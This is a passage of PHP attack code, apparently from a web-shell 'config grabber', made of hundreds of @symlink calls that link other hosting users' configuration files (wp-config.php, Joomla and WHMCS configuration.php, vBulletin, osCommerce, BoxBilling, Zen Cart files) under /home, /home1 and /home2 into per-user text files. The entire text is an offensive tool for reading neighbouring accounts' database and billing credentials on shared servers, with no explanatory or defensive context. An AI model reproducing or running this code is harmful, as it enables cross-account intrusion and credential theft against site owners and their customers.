@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
